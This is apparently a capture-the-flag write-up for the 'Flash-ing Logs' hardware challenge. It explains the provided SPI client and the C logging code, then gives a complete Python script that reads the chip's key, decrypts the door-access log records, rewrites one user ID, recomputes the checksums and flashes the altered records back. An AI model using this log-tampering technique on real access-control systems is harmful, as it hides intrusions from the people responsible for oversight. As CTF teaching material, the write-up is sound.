# Cyber Apocalypse 2024

# Flash-ing Logs | hard | hw

> After deactivating the lasers, you approach the door to the server room. It seems there's a secondary flash memory inside, storing the log data of every entry. As the system is air-gapped, you must modify the logs directly on the chip to avoid detection. Be careful to alter only the user_id = 0x5244 so the registered logs point out to a different user. The rest of the logs stored in the memory must remain as is.

## Analysis

Starting off from the narrative, it's quite an interesting challenge that involves a getaway scenario. It makes sense, the chip is used to log events happening at the server room's door mechanism. Our mission is to remain undetected, which means we need to dump the data from the chip, analyze its logging structure, identify `user_id = 0x5244`, then finally, alter the data so it points to another user. Not just delete, but modify.

We are given 2 files: python `client.py` script and the `log_event.c` source code.

An earlier challenge within this same CTF event also dealt with the exact same chip, `W25Q128` from Winbond. That challenge was named `RIDS`. It was an easy challenge. This one is a hard. That is why the `client.py` might look familiar to us. It is a python client that offers basic communication with the chip. It is the barebone script that we can build on top of. But at least we know how to read the memory, that's given.

The good news is that we are given the source code as well for the event logging mechanism. 

That's what we need to start off with, as well as grabbing the datasheet for the chip [Winbond W25Q128](https://www.pjrc.com/teensy/W25Q128FV.pdf).

## Analysis

The `client.py` is the small python client is illustrating a method how to communicate with the chip. The `exchange` function is defined entirely and an example command is also given at the end of the script, this `jedec_id = exchange([0x9F], 3)` line, which demonstrates how to interact with the hardware. Trying this out, at first, returns our assumption that indeed we are working with a Winbond W25Q128. `0xEF` (239 in decimal) indicates the manufacturer ID, which is Winbond. The `0x40` (64 in decimal) signifies Serial Flash Memory, while the `0x18` (24 in decimal) represents the memory capacity and organization, meaning 128MB chip (16MB) memory organized as 64 sectors of 4KB each.

```bash
└─$ python3 client.py               
[239, 64, 24]
```
Let's look at this python script.

```python
import socket
import json

FLAG_ADDRESS = [0x52, 0x52, 0x52]

def exchange(hex_list, value=0):

    # Configure according to your setup
    host = '127.0.0.1'  # The server's hostname or IP address
    port = 1337        # The port used by the server
    cs=0 # /CS on A*BUS3 (range: A*BUS3 to A*BUS7)
    
    usb_device_url = 'ftdi://ftdi:2232h/1'

    # Convert hex list to strings and prepare the command data
    command_data = {
        "tool": "pyftdi",
        "cs_pin":  cs,
        "url":  usb_device_url,
        "data_out": [hex(x) for x in hex_list],  # Convert hex numbers to hex strings
        "readlen": value
    }
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        # Serialize data to JSON and send
        s.sendall(json.dumps(command_data).encode('utf-8'))
        
        # Receive and process response
        data = b''
        while True:
            data += s.recv(1024)
            if data.endswith(b']'):
                break
                
        response = json.loads(data.decode('utf-8'))
        #print(f"Received: {response}")
    return response


# Example command
jedec_id = exchange([0x9F], 3)
print(jedec_id)
```
It's not surprising at all that we are given the the `FLAG_ADDRESS = [0x52, 0x52, 0x52]` - apparently from this exact location we can read the flag should we complete our mission. Moving on, what we can see is that the script is sending structured commands in a JSON to the server, which then interacts with the hardware. The structure is sending commands and receiving responses. The JSON object is serialized to a string and sent over the connection that is established. The loop is receiving data from the server in chunks of 1024 bytes until the ending-sequence character `]` is reached, signaling the end of the JSON array. Everything until that point is concatenated. Then finally this data is converted back into a python object and returned. This is how we are going to interact with the flash chip.

Now let's also dig deep and analyze the `log_event.c` source code. I'm going to attach only snippets from it, not the entire code.

First thing that stands out is that we know the structure of the _SmartLockEvent_. Which is practically the structure of the logging mechanism. How are the events logged within the chip, timestamp, event time, identifier, unlock method, and status. Also we can see that `CRC_SIZE` and `KEY_SIZE` constants are given.

```c
#define CRC_SIZE 4 // Size of the CRC data in bytes
#define KEY_SIZE 12 // Size of the key

// SmartLockEvent structure definition
typedef struct {
    uint32_t timestamp;   // Timestamp of the event
    uint8_t eventType;    // Numeric code for type of event // 0 to 255 (0xFF)
    uint16_t userId;      // Numeric user identifier // 0 t0 65535 (0xFFFF)
    uint8_t method;       // Numeric code for unlock method
    uint8_t status;       // Numeric code for status (success, failure)
} SmartLockEvent;
```
Immediatelly we find the `calculateCRC32` function that is responsible for calculating the CRC-32 checksum of a given data buffer. This checksum is critical for data integrity. In our challenge, this function is important because it ensures the integrity of the SmartLockEvent data structure by generating a CRC value that is appended to each event. This CRC value is then used to verify the integrity of the event data when read from or written to memory. But that won't be a problem, since we know the algorithm.

```c
// CRC-32 calculation function
uint32_t calculateCRC32(const uint8_t *data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; ++i) {
        crc ^= data[i];
        for (uint8_t j = 0; j < 8; ++j) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xEDB88320;
            else
                crc >>= 1;
        }
    }
    return ~crc;
}
```



## Putting it all Together

```python
import socket
import json
import struct
import binascii

# Constants provided in the example client script
FLAG_ADDRESS = [0x52, 0x52, 0x52]
RECORDS_SIZE = 2560
host = '94.237.54.170'  # Adjust as necessary
port = 38882          # Adjust as necessary
cs = 0
usb_device_url = 'ftdi://ftdi:2232h/1'

def exchange(hex_list, value=0):
    command_data = {
        "tool": "pyftdi",
        "cs_pin": cs,
        "url": usb_device_url,
        "data_out": [hex(x) for x in hex_list],
        "readlen": value
    }
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(json.dumps(command_data).encode('utf-8'))
        data = b''
        while True:
            data += s.recv(1024)
            if data.endswith(b']'):
                break
    return json.loads(data.decode('utf-8'))

def get_encryption_key():
    key_response = exchange([0x48, 0, 16, 0x52, 0, 0], 12)
    print(f"Encryption Key: {key_response}")
    return bytearray(key_response)

def read_data(length, addr):
    cmd = [0x03, (addr >> 16) & 0xff, (addr >> 8) & 0xff, addr & 0xff]
    return bytearray(exchange(cmd, length))

def write_data(data, addr):
    exchange([0x06])  # Enable writing
    cmd = [0x02, (addr >> 16) & 0xff, (addr >> 8) & 0xff, addr & 0xff] + list(data)
    exchange(cmd, len(data))
    while True:
        status = exchange([0x05], 1)[0]
        if status & 1 == 0:
            break

def modify_records(data, key):
    found_user_id = False
    for i in range(0, len(data), 16):
        record = data[i:i+12]  # Extract record excluding CRC
        decrypted_record = bytearray(b ^ key[j % len(key)] for j, b in enumerate(record))
        user_id = struct.unpack("<H", decrypted_record[6:8])[0]
        # Check and modify User ID 0x5244
        if user_id == 0x5244:
            found_user_id = True
            print(f"Modifying record for User ID {user_id} at position {i}.")
            struct.pack_into("<H", decrypted_record, 6, 0x5245)  # Change user ID
            new_crc = binascii.crc32(decrypted_record) & 0xffffffff  # Recalculate CRC
            struct.pack_into("<I", data, i+12, new_crc)  # Update CRC in original data
            # Re-encrypt modified record
            for j, b in enumerate(decrypted_record):
                data[i+j] = b ^ key[j % len(key)]
    if not found_user_id:
        print("No records with User ID 0x5244 found, but proceeding with operations...")
    return data

def process_flash(records):
    exchange([0x06])  # Enable writing
    exchange([0x20, 0, 0, 0])  # Erase sector
    print("Erasing sector and writing modified data back...")
    for i in range(0, len(records), 256):
        write_data(records[i:i+256], i)

def retrieve_flag():
    flag_addr = sum(byte << (8 * idx) for idx, byte in enumerate(reversed(FLAG_ADDRESS)))
    flag_data = read_data(100, flag_addr)
    print("Flag found:", flag_data.rstrip(b"\xff").decode())

key = get_encryption_key()
records = read_data(RECORDS_SIZE, 0)
modified_records = modify_records(records, key)
process_flash(modified_records)
retrieve_flag()
```

![image](https://github.com/respawnRW/writeups/assets/163560495/b5650366-07bc-4a1e-8eab-82047fa9d255)


Flag: `HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}`

Be done with it.

Hope you find it useful,

`--RW`

## Resources

[W25Q64FW Datasheet](https://www.pjrc.com/teensy/W25Q128FV.pdf)

